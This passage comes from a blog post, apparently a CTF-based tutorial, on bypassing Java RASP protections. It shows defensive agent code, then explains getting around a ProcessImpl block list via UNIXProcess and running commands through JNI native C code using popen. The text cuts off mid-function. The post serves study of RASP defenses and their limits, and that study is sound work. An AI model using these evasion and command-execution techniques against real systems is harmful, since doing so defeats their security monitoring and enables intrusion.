@@ -1,0 +1,1786 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Java 反序列化绕过 RASP - DumKiy's blog</title>
+
+<meta name="description" content="绕过 RASPRASP 简介RASP 全称为 Run­time Ap­pli­ca­tion Self-Pro­tec­tion，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准...">
+<link rel="canonical" href="http://localhost:4000/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Java 反序列化绕过 RASP</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-06-14-Java-反序列化绕过-RASP.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="Java 反序列化绕过 RASP"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization">Deserialization</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=RASP">RASP</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Jun 15, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-06-15T05:53:40+08:00">
+    <meta itemprop="keywords" content="Deserialization,RASP"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="绕过-rasp">绕过 RASP</h1>
+<h2 id="rasp-简介">RASP 简介</h2>
+<p>RASP 全称为 Run­time Ap­pli­ca­tion Self-Pro­tec­tion，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p>
+
+<p>Java RASP 通常使用 java agent 技术实现。以 <a href="https://github.com/chaitin/log4j2-vaccine">chaitin/log4j2-vaccine: log4j2-vaccine</a> 为例，Log4j2-Vaccin 是用于防护 log4j 漏洞利用的 RASP 实践。</p>
+
+<p>使用时仅需要将其作为 javaagent 加载即可：</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="nl">javaagent:</span><span class="n">agent</span><span class="o">.</span><span class="na">jar</span> <span class="o">-</span><span class="n">jar</span> <span class="n">web</span><span class="o">.</span><span class="na">jar</span>
+</code></pre></div></div>
+
+<p>其实现方法如下:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="nc">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="nc">String</span> <span class="n">className</span><span class="o">,</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span> <span class="nc">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IllegalClassFormatException</span> <span class="o">{</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"/"</span><span class="o">,</span><span class="s">"."</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="nc">JndiManagerClassName</span><span class="o">)){</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Vaccine] Start Patch JndiManager Lookup Method!"</span><span class="o">);</span>
+            <span class="nc">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="nc">CtMethod</span> <span class="n">ctMethod</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span><span class="o">{</span>
+                <span class="c1">// 初始化classPool</span>
+                <span class="nc">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ClassPool</span><span class="o">();</span>
+                <span class="n">classPool</span><span class="o">.</span><span class="na">appendSystemPath</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">LoaderClassPath</span><span class="o">(</span><span class="n">loader</span><span class="o">));</span>
+                <span class="o">}</span>
+
+                <span class="c1">// 构造CtClass</span>
+                <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
+
+                <span class="c1">// 获取lookup方法</span>
+                <span class="k">for</span><span class="o">(</span><span class="nc">CtMethod</span> <span class="nl">method:</span><span class="n">ctClass</span><span class="o">.</span><span class="na">getMethods</span><span class="o">()){</span>
+                    <span class="k">if</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="nc">JndiManagerLookupMethodName</span><span class="o">)){</span>
+                        <span class="n">ctMethod</span> <span class="o">=</span> <span class="n">method</span><span class="o">;</span>
+                        <span class="k">break</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="c1">// 修改lookup方法</span>
+                <span class="k">assert</span> <span class="n">ctMethod</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="c1">//ctMethod.insertBefore("if(name.startsWith(\"ldap://\") || name.startsWith(\"rmi://\")){return null;}");</span>
+                <span class="n">ctMethod</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">"return null;"</span><span class="o">);</span>
+
+                <span class="c1">// 返回字节码</span>
+                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Vaccine] Patch JndiManager Lookup Success!"</span><span class="o">);</span>
+                <span class="k">return</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span><span class="k">finally</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">ctClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+            <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+<p>使用 transform 方法对 org.apache.logging.log4j.core.net.JndiManager.lookup 方法进行运行时修改，使其提前返回 <code class="language-plaintext highlighter-rouge">return null</code>.</p>
+
+<p>根据 RASP 不同的实现，通常有两种方法绕过：</p>
+<ol>
+  <li>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</li>
+  <li>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</li>
+</ol>
+
+<h2 id="绕过黑名单">绕过黑名单</h2>
+<p>以 MRCTF 2022 springcoffee 中的 RASP 为例，这道题对 java.lang.ProcessImpl.start 函数进行了过滤。</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RaspTransformer</span> <span class="kd">implements</span> <span class="nc">ClassFileTransformer</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="nc">Instrumentation</span> <span class="n">inst</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">targetClassName</span> <span class="o">=</span> <span class="s">"java.lang.ProcessImpl"</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">targetMethodName</span> <span class="o">=</span> <span class="s">"start"</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">RaspTransformer</span><span class="o">(</span><span class="nc">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">inst</span> <span class="o">=</span> <span class="n">inst</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="nc">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="nc">String</span> <span class="n">className</span><span class="o">,</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span> <span class="nc">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IllegalClassFormatException</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"/"</span><span class="o">,</span> <span class="s">"."</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="n">targetClassName</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Vaccine] Start Patch JndiManager Lookup Method!"</span><span class="o">);</span>
+            <span class="nc">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="nc">CtMethod</span> <span class="n">ctMethod</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="nc">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ClassPool</span><span class="o">();</span>
+                <span class="n">classPool</span><span class="o">.</span><span class="na">appendSystemPath</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">LoaderClassPath</span><span class="o">(</span><span class="n">loader</span><span class="o">));</span>
+                <span class="o">}</span>
+
+                <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
+                <span class="nc">CtMethod</span><span class="o">[]</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getMethods</span><span class="o">();</span>
+                <span class="kt">int</span> <span class="n">var10</span> <span class="o">=</span> <span class="n">var9</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+
+                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var11</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var11</span> <span class="o">&lt;</span> <span class="n">var10</span><span class="o">;</span> <span class="o">++</span><span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="nc">CtMethod</span> <span class="n">method</span> <span class="o">=</span> <span class="n">var9</span><span class="o">[</span><span class="n">var11</span><span class="o">];</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">targetMethodName</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="n">ctMethod</span> <span class="o">=</span> <span class="n">method</span><span class="o">;</span>
+                        <span class="k">break</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+
+                <span class="k">assert</span> <span class="n">ctMethod</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
+
+                <span class="n">ctMethod</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">"return null;"</span><span class="o">);</span>
+                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"Patch %s %s  Success!"</span><span class="o">,</span> <span class="n">targetClassName</span><span class="o">,</span> <span class="n">targetMethodName</span><span class="o">));</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">var18</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+                <span class="k">return</span> <span class="n">var18</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var16</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">var16</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">ctClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+                <span class="o">}</span>
+
+            <span class="o">}</span>
+
+            <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>Java 命令执行的几种方式中，追溯到底层其实只有 UNIXProcess 和 ProcessImpl，因此这里可以用 UNIXProcess 进行绕过。</p>
+
+<h2 id="通过-jni-绕过-rasp">通过 JNI 绕过 RASP</h2>
+<p>JNI（Java Native Interface）是 Java 提供的一种机制，用于在 Java 程序中调用本地（Native）代码，即使用其他语言（如C、C++）编写的代码，从而可以充分利用本地代码的功能和性能优势，实现对底层系统资源和外部库的访问。</p>
+
+<h3 id="jni-基本使用">JNI 基本使用</h3>
+<p>JNI 的基本使用参考博客：<a href="http://www.bmth666.cn/bmth_blog/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/#JNI%E7%BB%95%E8%BF%87RASP">RASP绕过初探#rasp绕过</a></p>
+
+<p>步骤可以归纳为如下的五步：</p>
+<ol>
+  <li>编写一个 java 文件，其中定义一个 native 方法，然后使用 javac 编译得到 .class 文件</li>
+  <li>使用 javah 进行对 .class 文件进行处理，得到编写 C 代码所需的头文件。</li>
+  <li>编写命令执行的 C 语言实现</li>
+  <li>将编写的 C 代码编译为 lib 或者 dll（注意jdk版本要与目标机器的jdk保持一致）</li>
+  <li>编写一个 Java 类调用 System.loadLibrary 方法加载 dll 文件。</li>
+</ol>
+
+<h4 id="第一步编写-native-方法">第一步：编写 native 方法</h4>
+<p>新建一个 NativeLibraryExample 类：</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NativeLibraryExample</span> <span class="o">{</span>
+    <span class="c1">// 声明native方法</span>
+    <span class="kd">public</span> <span class="kd">native</span> <span class="kt">void</span> <span class="nf">nativeMethod</span><span class="o">(</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">);</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="nc">NativeLibraryExample</span> <span class="n">example</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativeLibraryExample</span><span class="o">();</span>
+
+        <span class="n">example</span><span class="o">.</span><span class="na">nativeMethod</span><span class="o">(</span><span class="s">"mate-calc"</span><span class="o">);</span> <span class="c1">// 调用native方法</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+<p>使用 javac 对其进行编译：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac NativeLibraryExample.java
+</code></pre></div></div>
+<p>得到了 NativeLibraryExample.class 文件</p>
+
+<h4 id="第二步使用-javah-生成头文件">第二步：使用 javah 生成头文件</h4>
+<p>使用 javah 生成对应的头文件。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javah <span class="nt">-jni</span> NativeLibraryExample
+</code></pre></div></div>
+<p>得到 NativeLibraryExample.h</p>
+
+<h4 id="第三步编写-c-代码">第三步：编写 C 代码</h4>
+<p>编写 C 语言实现，包含上一步生成的 .h 文件:</p>
+
+<p>JniClass.c</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;jni.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"NativeLibraryExample.h"</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">execmd</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">12</span><span class="p">];</span>              <span class="c1">//定义缓冲区</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="c1">//打开管道，并执行命令</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//返回0表示运行失败</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="n">pipe</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">pipe</span><span class="p">))</span>
+        <span class="p">{</span> <span class="c1">//将管道输出到result中</span>
+            <span class="n">strcat</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
